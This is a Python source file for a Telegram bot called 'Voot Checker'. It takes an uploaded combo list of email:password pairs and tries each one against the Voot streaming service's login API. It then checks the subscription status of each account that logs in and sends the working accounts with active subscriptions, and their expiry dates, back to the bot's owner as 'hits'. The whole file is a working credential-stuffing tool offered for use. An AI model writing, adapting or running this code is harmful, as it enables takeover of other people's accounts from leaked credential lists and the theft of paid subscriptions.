#Name: Voot Checker
#Author: Zero


try:
    import pyfiglet
    import requests
    import json                                         
    from telethon.sync import TelegramClient
    from telethon import TelegramClient,events
    from telethon.sync import TelegramClient

except:
    import os
    os.system('pip install requests')
    os.system('pip install telethon')
    os.system('pip install pyfiglet')
    import pyfiglet
    import requests
    import json                                         
    from telethon.sync import TelegramClient
    from telethon import TelegramClient,events
    from telethon.sync import TelegramClient


try:
    imp_data = list()
    tyer = open('session.txt', 'r')
    for i in range(0,4):
        imp_data.append(str(tyer.readline()))
    tyer.close()
    api_id = str(imp_data[0])[:-2]
    api_hash = str(imp_data[1])[:-2]
    bot_token = str(imp_data[2])[:-2]
    owner = int(imp_data[3])

except:
    api_id = input('Enter Api Id: ')
    api_hash = input('Enter Api Hash: ')
    bot_token = input('Enter Bot Token: ')
    owner = int(input('Enter User Id: '))
    tyer = open('session.txt', 'w')
    tyer.write(api_id + '\n' + api_hash + '\n' + bot_token + '\n' + str(owner))
    tyer.close()

print(pyfiglet.figlet_format("ZERO"))
print('\nVoot checker bot by Zero.')

client = TelegramClient('bot', api_id, api_hash).start(bot_token=bot_token)
@client.on(events.NewMessage)
async def my_event_handler(event):
    if event.peer_id.user_id == owner and event.raw_text == '/check':
        await event.download_media("./"+'database.txt')
        data_holder = dict()

        def reset():
            writer = open('voot_hits.txt', 'w')
            writer.write('voot checker by Zero Checkers\n')
            writer.close()

        def database(): # getting email and password from combo file
            opener = open('database.txt')
            while True:
                reader = opener.readline()
                if reader == "":
                    opener.close()
                    break                                      
                email = reader[0:reader.find(':')]
                password = reader[reader.find(':')+1:-1]
                data_holder[email] = password

        def hits(hit): # saving the hits.
            writer = open('voot_hits.txt', 'a')
            writer.write(hit)
            writer.close()

        database()

        count = 0
        while count<len(data_holder):
            url = 'https://userauth.voot.com/usersV3/v3/login'
            header = {
                'authority': 'userauth.voot.com',
                'method': 'POST',
                'path': '/usersV3/v3/login',
                'scheme': 'https',
                'accept': 'application/json, text/plain, */*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-US,en;q=0.9',
                'content-length': '130',
                'content-type': 'application/json;charset=UTF-8',
                'origin': 'https://www.voot.com',
                'referer': 'https://www.voot.com/',
                'sec-ch-ua': '" Not;A Brand";v="99", "Microsoft Edge";v="91", "Chromium";v="91"',
                'sec-ch-ua-mobile': '?0',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36 Edg/91.0.864.71',
                }
            post_data = {'type': "traditional", 'deviceId': "Windows NT 6.3", 'deviceBrand': "PC/MAC", 'data': {'email': str(list(data_holder.keys())[count]), 'password': str(list(data_holder.values())[count])}}
            posts = requests.post(url=url, headers=header, json=post_data)
            status = int(posts.status_code)
            if status == 200:
                try:
                    checker = json.loads(posts.text)
                    access_token = str(checker['data']['authToken']['accessToken'])
                    url = 'https://pxapi.voot.com/smsv4/int/ps/v1/voot/user/entitlement/status'
                    header = {
                        'accesstoken': access_token,
                        'Accept': 'application/json, text/plain, */*',
                        'Accept-Encoding': 'gzip, deflate, br',
                        'Accept-Language': 'en-US,en;q=0.9',
                        'origin': 'https://www.voot.com',
                        'referer': 'https://www.voot.com/',
                        'user-agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36'
                    }
                    requs = requests.get(url, headers=header)
                    checker = json.loads(requs.text)
                    status = checker['status']
                    if status == "active":
                        expiry = str(checker['activeTillDate']['gmtDate'])
                        expiry = expiry[:expiry.find(':')-3]
                        hitter = str(list(data_holder.keys())[count]) + str(list(data_holder.values())[count]) + '  ||  Expiry --> ' + expiry + '\n'
                        print(hitter)
                        hits(hitter)
                except:
                    pass
            count = count+1
        try:
            await client.send_file(event.peer_id.user_id, 'voot_hits.txt', caption='Checker by @zero_checkers. \nVoot Checker.')
        except:
            await client.send_message(event.peer_id.user_id, 'Got 0 Hits.')
        reset()



client.run_until_disconnected()



